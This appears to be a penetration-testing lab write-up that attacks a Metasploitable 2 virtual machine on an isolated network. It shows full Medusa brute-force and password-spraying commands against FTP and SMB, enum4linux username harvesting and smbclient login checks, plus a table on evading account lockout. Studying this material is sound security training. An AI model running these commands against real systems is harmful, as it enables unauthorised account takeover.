# Security Testing Scenarios & Technical Analysis

## Lab Architecture & Testbed
* **Auditing Platform:** Kali Linux (Medusa v2.2+)
* **Target System:** Metasploitable 2 - IP `192.168.56.101`
* **Network Mode:** VirtualBox Host-Only Adapter (Isolated Environment)

---

## Scenario 1: Authentication Testing on FTP (Port 21)

### 1. Objective
Audit the strength of the vsftpd FTP service by evaluating resilience against automated dictionary attacks.

### 2. Command
```bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -f -v 4
```

### 3. Parameters
* `-h 192.168.56.101`: Target host IP.
* `-U users.txt`: Wordlist with candidate usernames.
* `-P passwords.txt`: Wordlist with candidate passwords.
* `-M ftp`: FTP authentication module (`ftp.mod`).
* `-f`: Terminates execution on the first successful match.
* `-v 4`: Verbosity level for tracking attempt progress.

### 4. Results & Evidence
* **Discovered Account:** `msfadmin:msfadmin`
* **Status:** `[SUCCESS]`

![FTP Audit Evidence](../images/02-medusa-ftp-attack.png)

---

## Scenario 2: SMB Service Auditing & Password Spraying (Port 445)

### 1. Objective
Evaluate the SMB service against username enumeration and low-frequency password spraying across all discovered accounts.

### 2. Multi-Stage Execution

#### Stage 1: Account Enumeration
Using `enum4linux` via anonymous session to enumerate valid user accounts:
```bash
enum4linux -U 192.168.56.101 | grep "user:" | awk -F'[' '{print $2}' | awk -F']' '{print $1}' > smb_users.txt
```

#### Stage 2: Targeted Password Spraying
Testing a single common default credential across all enumerated users with Medusa:
```bash
medusa -h 192.168.56.101 -U smb_users.txt -p "msfadmin" -M smbnt -f -v 4
```

* **Result:** `msfadmin:msfadmin` identified with `ADMIN$` access allowed.

![SMB Spraying Evidence](../images/03-smb-password-spraying.png)

#### Stage 3: Verification of Access
Validating the credentials by connecting to the shared resource:
```bash
smbclient //192.168.56.101/tmp -U msfadmin
```

![SMB Validation Evidence](../images/04-smbclient-access-validation.png)

---

## Technical Comparison of Methods

| Feature | Traditional Brute Force | Password Spraying |
| :--- | :--- | :--- |
| **Strategy** | Many passwords against one user | One common password against many users |
| **Noise Level** | High (triggers rapid alerts) | Low (blends with normal user errors) |
| **Lockout Impact** | Accounts lock out quickly | Evades standard account lockout thresholds |
| **Primary Target** | Administrative or key accounts | Broad organizational user base |